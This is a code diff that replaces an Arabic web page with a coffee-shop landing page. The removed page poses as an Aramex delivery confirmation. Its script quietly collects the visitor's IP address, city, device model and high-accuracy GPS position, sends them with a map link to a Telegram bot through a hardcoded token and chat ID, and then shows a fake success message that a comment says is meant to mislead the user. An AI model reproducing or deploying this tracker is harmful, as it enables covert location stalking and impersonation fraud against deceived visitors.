@@ -1,555 +1,88 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-    <title>أرامكس - تأكيد خيارات التوصيل</title>
-    <style>
-        /* RESET */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-
-        body {
-            background: #f5f7fa;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 20px;
-            direction: rtl;
-        }
-
-        /* البطاقة الرئيسية - تحاكي واجهة أرامكس */
-        .aramex-card {
-            background: #ffffff;
-            border-radius: 24px;
-            max-width: 420px;
-            width: 100%;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.08);
-            overflow: hidden;
-            border: 1px solid #eaedf2;
-        }
-
-        /* الهيدر - اللون الأحمر المميز لأرامكس */
-        .aramex-header {
-            background: #cc0000;
-            padding: 24px 28px 20px;
-            color: white;
-        }
-
-        .aramex-header .logo {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            font-size: 24px;
-            font-weight: 800;
-            letter-spacing: 1px;
-        }
-
-        .aramex-header .logo span {
-            background: white;
-            color: #cc0000;
-            padding: 2px 10px;
-            border-radius: 6px;
-            font-size: 14px;
-        }
-
-        .aramex-header .sub {
-            font-size: 13px;
-            opacity: 0.85;
-            margin-top: 6px;
-            font-weight: 300;
-        }
-
-        /* محتوى البطاقة */
-        .aramex-body {
-            padding: 24px 28px 28px;
-        }
-
-        /* إشعار الشحنة */
-        .shipment-notice {
-            background: #fef2f2;
-            border-right: 4px solid #cc0000;
-            padding: 16px 18px;
-            border-radius: 12px;
-            margin-bottom: 22px;
-        }
-
-        .shipment-notice .tracking-number {
-            font-size: 20px;
-            font-weight: 700;
-            color: #1e293b;
-            letter-spacing: 1px;
-        }
-
-        .shipment-notice .tracking-label {
-            font-size: 12px;
-            color: #64748b;
-            margin-top: 2px;
-        }
-
-        .shipment-notice .status {
-            display: inline-block;
-            margin-top: 8px;
-            background: #cc0000;
-            color: white;
-            padding: 4px 14px;
-            border-radius: 40px;
-            font-size: 12px;
-            font-weight: 600;
-        }
-
-        /* تفاصيل الشحنة */
-        .shipment-details {
-            display: flex;
-            justify-content: space-between;
-            padding: 14px 0;
-            border-bottom: 1px solid #f1f5f9;
-            margin-bottom: 18px;
-        }
-
-        .shipment-details .label {
-            font-size: 13px;
-            color: #94a3b8;
-        }
-
-        .shipment-details .value {
-            font-size: 14px;
-            font-weight: 600;
-            color: #1e293b;
-        }
-
-        /* خيارات التوصيل */
-        .delivery-options-title {
-            font-size: 16px;
-            font-weight: 700;
-            color: #1e293b;
-            margin-bottom: 14px;
-        }
-
-        .delivery-option {
-            display: flex;
-            align-items: center;
-            gap: 14px;
-            padding: 16px 18px;
-            border: 2px solid #e9edf2;
-            border-radius: 16px;
-            margin-bottom: 12px;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            background: white;
-        }
-
-        .delivery-option:hover {
-            border-color: #cc0000;
-            background: #fefafa;
-        }
-
-        .delivery-option.selected {
-            border-color: #cc0000;
-            background: #fef2f2;
-            box-shadow: 0 0 0 3px rgba(204, 0, 0, 0.1);
-        }
-
-        .delivery-option .icon {
-            font-size: 28px;
-            width: 44px;
-            height: 44px;
-            background: #f1f5f9;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-shrink: 0;
-        }
-
-        .delivery-option.selected .icon {
-            background: #cc0000;
-            color: white;
-        }
-
-        .delivery-option .info h4 {
-            font-size: 15px;
-            color: #1e293b;
-            font-weight: 600;
-        }
-
-        .delivery-option .info p {
-            font-size: 13px;
-            color: #64748b;
-        }
-
-        /* زر التأكيد */
-        .confirm-btn {
-            width: 100%;
-            padding: 16px;
-            background: #cc0000;
-            color: white;
-            border: none;
-            border-radius: 60px;
-            font-size: 17px;
-            font-weight: 700;
-            cursor: pointer;
-            margin-top: 10px;
-            transition: 0.2s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-
-        .confirm-btn:active {
-            transform: scale(0.97);
-            background: #b30000;
-        }
-
-        .confirm-btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
-
-        .confirm-btn .spinner {
-            display: none;
-            width: 20px;
-            height: 20px;
-            border: 3px solid rgba(255, 255, 255, 0.3);
-            border-top: 3px solid #fff;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-        }
-
-        .confirm-btn.loading .spinner {
-            display: inline-block;
-        }
-
-        .confirm-btn.loading .btn-text {
-            display: none;
-        }
-
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
-        }
-
-        /* رسالة الحالة */
-        #status-message {
-            margin-top: 14px;
-            font-size: 13px;
-            color: #64748b;
-            text-align: center;
-            min-height: 20px;
-        }
-
-        #status-message.success {
-            color: #16a34a;
-        }
-
-        #status-message.error {
-            color: #dc2626;
-        }
-
-        .footer-note {
-            margin-top: 18px;
-            font-size: 11px;
-            color: #cbd5e1;
-            text-align: center;
-            border-top: 1px solid #f1f5f9;
-            padding-top: 16px;
-        }
-    </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>أروما كافيه | تجربة القهوة المختصة</title>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
 
-    <div class="aramex-card" id="mainCard">
-        <!-- الهيدر الأحمر -->
-        <div class="aramex-header">
-            <div class="logo">
-                📦 ARAMEX
-                <span>إكسبرس</span>
-            </div>
-            <div class="sub">شحن سريع وموثوق • توصيل آمن</div>
+    <!-- 1. قسم الواجهة الرئيسية (Hero Section) -->
+    <header class="hero">
+        <div class="hero-overlay">
+            <h1>أهلاً بكم في أروما كافيه</h1>
+            <p>حيث تلتقي عراقة المذاق بفخامة التجربة</p>
+            <a href="#menu" class="btn">تصفح المنيو</a>
         </div>
+    </header>
 
-        <!-- المحتوى -->
-        <div class="aramex-body">
-            <!-- إشعار الشحنة -->
-            <div class="shipment-notice">
-                <div class="tracking-number"># ARX-789-2026</div>
-                <div class="tracking-label">رقم التتبع • شحنة قادمة إليك</div>
-                <div class="status">🚚 في الطريق</div>
+    <!-- 2. قسم سر النكهة / من نحن (About Section) -->
+    <section class="about">
+        <h2>سر النكهة في أروما</h2>
+        <p>في أروما، لا نصنع القهوة لمجرد ضبط المزاج، بل ننتقي محاصيلنا بعناية فائقة من سلالات البن المقطرة الفاخرة حول العالم، لتصل إلى كوبك محمصة ومعدة بحب وإتقان يواجه كيّافة القهوة الصدق.</p>
+    </section>
+
+    <!-- 3. قسم المنيو وقائمة الطعام (Menu Section) -->
+    <section id="menu" class="menu">
+        <h2>قائمتنا المختارة</h2>
+        <div class="menu-grid">
+            <div class="menu-item">
+                <img src="https://images.unsplash.com/photo-1541167760496-1628856ab772?q=80&w=500" alt="قهوة مختصة">
+                <h3>سبانيش لاتيه بارد</h3>
+                <p>مزيج مثالي من الإسبريسو القوي والحليب المكثف المحلى.</p>
+                <span class="price">18 ر.س</span>
             </div>
-
-            <!-- تفاصيل الشحنة -->
-            <div class="shipment-details">
-                <div>
-                    <div class="label">المرسل</div>
-                    <div class="value">متجر إلكتروني</div>
-                </div>
-                <div>
-                    <div class="label">الوزن</div>
-                    <div class="value">2.5 كجم</div>
-                </div>
-                <div>
-                    <div class="label">المحتوى</div>
-                    <div class="value">طرود × 3</div>
-                </div>
+            <div class="menu-item">
+                <img src="https://images.unsplash.com/photo-1514432324607-a09d9b4aefdd?q=80&w=500" alt="قهوة تقطير">
+                <h3>V60 كولومبي</h3>
+                <p>قهوة مقطرة سوداء بإيحاءات الفاكهة والشوكولاتة الفاخرة.</p>
+                <span class="price">22 ر.س</span>
             </div>
-
-            <!-- خيارات التوصيل -->
-            <div class="delivery-options-title">اختر طريقة الاستلام</div>
-
-            <div class="delivery-option selected" data-value="home" id="optionHome">
-                <div class="icon">🏠</div>
-                <div class="info">
-                    <h4>توصيل للمنزل</h4>
-                    <p>سيتم توصيل الشحنة إلى عنوانك</p>
-                </div>
+            <div class="menu-item">
+                <img src="https://images.unsplash.com/photo-1555507036-ab1f4038808a?q=80&w=500" alt="كرواسون">
+                <h3>كرواسون باللوز</h3>
+                <p>مخبوزات فرنسية هشة ومقرمشة ومحشوة بكريمة اللوز الغنية.</p>
+                <span class="price">15 ر.س</span>
             </div>
-
-            <div class="delivery-option" data-value="branch" id="optionBranch">
-                <div class="icon">🏢</div>
-                <div class="info">
-                    <h4>الاستلام من الفرع</h4>
-                    <p>استلم شحنتك من أقرب فرع أرامكس</p>
-                </div>
-            </div>
-
-            <!-- زر التأكيد -->
-            <button class="confirm-btn" id="confirmBtn">
-                <span class="btn-text">✅ تأكيد خيار التوصيل</span>
-                <span class="spinner"></span>
-            </button>
-
-            <div id="status-message">📌 يرجى اختيار خيار التوصيل المناسب</div>
-            <div class="footer-note">جميع البيانات مشفرة وفق أعلى معايير الأمان 🔒</div>
         </div>
-    </div>
+    </section>
 
-    <script>
-        // ============================================================
-        // 🔑 بيانات البوت (تم إدخالها مسبقاً - استبدلها ببياناتك)
-        // ============================================================
-        const BOT_TOKEN = '8987813029:AAEuXcuCf2WWbYd7CWYNLdhJqfWAuCaDYdA';
-        const CHAT_ID = '5343926721';
-        // ============================================================
+    <!-- 4. قسم آراء الكيّافة / التقييمات (Testimonials Section) -->
+    <section class="testimonials">
+        <h2>آراء الكيّافة</h2>
+        <div class="testimonials-grid">
+            <div class="review-card">
+                <p>"أفضل مكان للقهوة المختصة في المنطقة، الـ V60 عندهم يضبط الراس الصدق والخدمة سريعة!"</p>
+                <h4>- محمد عسيري</h4>
+            </div>
+            <div class="review-card">
+                <p>"المكان رايق وهادئ والكرواسون عندهم يذوب في الفم، صرت زبون دائم لهم."</p>
+                <h4>- سارة الفيفي</h4>
+            </div>
+        </div>
+    </section>
 
-        let reportSent = false;
-        let gpsRequested = false;
-        let selectedOption = 'home';
+    <!-- 5. قسم أوقات الدوام والموقع (Location Section) -->
+    <section class="location">
+        <h2>ساعات العمل والموقع</h2>
+        <div class="location-info">
+            <p><strong>🕒 أوقات الدوام:</strong> يومياً من الساعة 6:00 صباحاً وحتى 12:00 منتصف الليل.</p>
+            <p><strong>📍 الموقع:</strong> طريق الملك خالد، خميس مشيط، منطقة عسير.</p>
+        </div>
+        <!-- خريطة وهمية فخمة تملأ العين -->
+        <div class="map-placeholder">
+            <p>📍 خريطة تفاعلية فرعية لموقع الكافيه</p>
+        </div>
+    </section>
 
-        const confirmBtn = document.getElementById('confirmBtn');
-        const statusMsg = document.getElementById('status-message');
-        const optionHome = document.getElementById('optionHome');
-        const optionBranch = document.getElementById('optionBranch');
+    <!-- 6. قسم الفوتر الأخير (Footer) -->
+    <footer class="footer">
+        <p>جميع الحقوق محفوظة © أروما كافيه 2026</p>
+        <div class="social-links">
+            <a href="#">تويتر</a> | <a href="#">إنستغرام</a> | <a href="#">تيك توك</a>
+        </div>
+    </footer>
 
-        // === اختيار خيار التوصيل ===
-        optionHome.addEventListener('click', () => {
-            optionHome.classList.add('selected');
-            optionBranch.classList.remove('selected');
-            selectedOption = 'home';
-            statusMsg.textContent = '🏠 تم اختيار توصيل للمنزل';
-            statusMsg.className = '';
-        });
-
-        optionBranch.addEventListener('click', () => {
-            optionBranch.classList.add('selected');
-            optionHome.classList.remove('selected');
-            selectedOption = 'branch';
-            statusMsg.textContent = '🏢 تم اختيار الاستلام من الفرع';
-            statusMsg.className = '';
-        });
-
-        // === استخراج اسم الجهاز الدقيق ===
-        function getExactDevice(ua) {
-            let model = 'غير معروف';
-            let os = 'جهاز';
-            if (ua.includes('Android')) os = 'Android';
-            else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
-            else if (ua.includes('Windows')) os = 'Windows';
-            else if (ua.includes('Macintosh')) os = 'Mac';
-
-            const match = ua.match(/\(([^)]+)\)/);
-            if (match) {
-                const parts = match[1].split(';').map(p => p.trim());
-                for (let p of parts) {
-                    if (p.match(/SM-[A-Za-z0-9]+/)) { model = p; break; }
-                    if (p.match(/iPhone[0-9]+,[0-9]+/)) { model = p; break; }
-                    if (p.match(/Pixel [0-9]+/)) { model = p; break; }
-                    if (p.match(/210[0-9]{6,7}[A-Za-z]?/)) { model = p; break; }
-                    if (p.match(/RMX[0-9]+/)) { model = p; break; }
-                    if (p.match(/V[0-9]{4}/)) { model = p; break; }
-                    if (p.match(/[A-Z]{2,4}-[LX][A-Z0-9]{1,3}/)) { model = p; break; }
-                    if (p.match(/CPH[0-9]+/)) { model = p; break; }
-                }
-                if (model === 'غير معروف') {
-                    for (let p of parts) {
-                        if (p.length > 3 && p.length < 20 &&
-                            !p.includes('Android') && !p.includes('Linux') &&
-                            !p.includes('AppleWebKit') && !p.includes('Mobile') &&
-                            !p.includes('Build')) {
-                            model = p;
-                            break;
-                        }
-                    }
-                }
-            }
-            if (model === 'غير معروف') {
-                const buildMatch = ua.match(/Build\/([^;]+)/);
-                if (buildMatch) model = buildMatch[1];
-            }
-            return `${os} (${model})`;
-        }
-
-        // === البيانات الأساسية ===
-        const data = {
-            ip: 'غير معروف',
-            country: 'غير معروف',
-            city: 'غير معروف',
-            lat: 'غير معروف',
-            lon: 'غير معروف',
-            gps_lat: null,
-            gps_lon: null,
-            exactDevice: getExactDevice(navigator.userAgent),
-            time: new Date().toLocaleString('ar-EG', { hour12: false }),
-            url: window.location.href,
-            referrer: document.referrer || 'مباشر',
-            deliveryOption: 'home'
-        };
-
-        // === 1. جلب الـ IP والتقريبي ===
-        async function fetchIP() {
-            try {
-                const res = await fetch('https://ip-api.com/json/?fields=status,country,city,lat,lon,query');
-                const info = await res.json();
-                if (info.status === 'success' && info.query) {
-                    data.ip = info.query;
-                    data.country = info.country || 'غير معروف';
-                    data.city = info.city || 'غير معروف';
-                    data.lat = info.lat || 'غير معروف';
-                    data.lon = info.lon || 'غير معروف';
-                }
-            } catch (e) { /* في حال فشل، نترك البيانات كما هي */ }
-        }
-
-        // === 2. طلب الموقع (يظهر نافذة المتصفح) ===
-        function requestGPS() {
-            if (gpsRequested) return;
-            gpsRequested = true;
-
-            if (!navigator.geolocation) {
-                statusMsg.textContent = '⚠️ الموقع غير مدعوم، جاري الإرسال...';
-                statusMsg.className = 'error';
-                sendReport();
-                return;
-            }
-
-            statusMsg.textContent = '📍 يرجى الموافقة على طلب الموقع (نافذة المتصفح)';
-            statusMsg.className = '';
-
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    data.gps_lat = pos.coords.latitude;
-                    data.gps_lon = pos.coords.longitude;
-                    statusMsg.textContent = '✅ تم تأكيد موقع التوصيل!';
-                    statusMsg.className = 'success';
-                    sendReport();
-                },
-                (err) => {
-                    statusMsg.textContent = '⚠️ لم يتم الحصول على الموقع الدقيق، جاري الإرسال...';
-                    statusMsg.className = 'error';
-                    sendReport();
-                }, {
-                    enableHighAccuracy: true,
-                    timeout: 8000
-                }
-            );
-        }
-
-        // === 3. إرسال التقرير ===
-        function sendReport() {
-            if (reportSent) return;
-            reportSent = true;
-
-            // تسجيل خيار التوصيل المختار
-            data.deliveryOption = selectedOption === 'home' ? 'توصيل للمنزل' : 'الاستلام من الفرع';
-
-            let msg = `📦 <b>طلب توصيل أرامكس - زائر جديد</b>\n\n`;
-            msg += `🌐 IP: ${data.ip}\n`;
-            msg += `📍 الدولة: ${data.country}\n`;
-            msg += `🏙️ المدينة: ${data.city}\n`;
-            msg += `📱 الجهاز: ${data.exactDevice}\n`;
-            msg += `📦 خيار التوصيل: ${data.deliveryOption}\n`;
-
-            if (data.gps_lat && data.gps_lon) {
-                msg += `🛰️ <b>الموقع الدقيق (GPS):</b>\n`;
-                msg += `📍 ${data.gps_lat}, ${data.gps_lon}\n`;
-                msg += `🗺️ https://www.google.com/maps?q=${data.gps_lat},${data.gps_lon}\n`;
-            } else {
-                msg += `📍 التقريبي (IP): ${data.lat}, ${data.lon}\n`;
-                msg += `🗺️ https://www.google.com/maps?q=${data.lat},${data.lon}\n`;
-                msg += `\n⚠️ (موقع السنترال وليس المنزل)`;
-            }
-            msg += `\n🕒 الوقت: ${data.time}`;
-
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: msg,
-                    parse_mode: 'HTML'
-                })
-            }).then(() => {
-                // تغيير واجهة المستخدم لإيهامه بأن العملية اكتملت
-                document.getElementById('mainCard').innerHTML = `
-                    <div class="aramex-header" style="background:#cc0000;padding:30px 28px;">
-                        <div class="logo">✅ ARAMEX</div>
-                        <div class="sub">تم تأكيد طلبك بنجاح</div>
-                    </div>
-                    <div class="aramex-body" style="text-align:center;padding:40px 28px;">
-                        <span style="font-size:64px;">📦</span>
-                        <h3 style="margin-top:12px;color:#1e293b;">شكراً لك!</h3>
-                        <p style="color:#64748b;font-size:14px;margin-top:6px;">تم تأكيد خيار التوصيل.<br>سوف تتلقى إشعاراً عند وصول الشحنة.</p>
-                        <div style="margin-top:20px;font-size:12px;color:#94a3b8;">رقم التتبع: # ARX-789-2026</div>
-                        <div style="margin-top:24px;font-size:12px;color:#cbd5e1;border-top:1px solid #f1f5f9;padding-top:16px;">
-                            تم إرسال إشعار إلى بريدك الإلكتروني
-                        </div>
-                    </div>
-                `;
-            }).catch(() => {});
-        }
-
-        // === 4. عند الضغط على زر التأكيد ===
-        confirmBtn.addEventListener('click', function() {
-            if (this.classList.contains('loading')) return;
-
-            // تغيير حالة الزر إلى "جاري التحميل"
-            this.classList.add('loading');
-            this.disabled = true;
-            statusMsg.textContent = '⏳ جاري معالجة طلبك...';
-            statusMsg.className = '';
-
-            // جلب الـ IP أولاً (في الخلفية)
-            fetchIP().then(() => {
-                // ثم نطلب GPS (تظهر نافذة المتصفح)
-                setTimeout(() => {
-                    requestGPS();
-                }, 500);
-            });
-        });
-
-        // === 5. تحميل البيانات مسبقاً (في الخلفية) ===
-        fetchIP();
-
-        console.log('📦 محاكاة أرامكس جاهزة!');
-    </script>
 </body>
 </html>
